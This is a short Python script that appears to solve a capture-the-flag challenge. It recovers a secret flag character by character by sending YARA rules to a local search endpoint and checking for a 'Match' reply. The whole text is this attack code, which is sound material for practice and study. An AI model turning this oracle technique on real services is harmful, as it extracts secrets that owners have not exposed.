import requests
import string
import concurrent.futures

url = "http://localhost:5000/search/"

characters = string.ascii_letters + string.digits

FLAG = "BUBU{"

def check_flag(char):
    global FLAG
    rule = 'rule bruteforce { strings: $a = "' + FLAG + char + '" condition: $a }'
    print(f"Trying: {FLAG + char}")

    response = requests.post(url, data={"rule": rule})

    if "Match" in response.text:
        print(f"Found flag: {''.join(FLAG)}")
        FLAG += char
        return True
    return False

with concurrent.futures.ThreadPoolExecutor() as executor:
    for _ in range(30):
        futures = {executor.submit(check_flag, char): char for char in characters}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                break
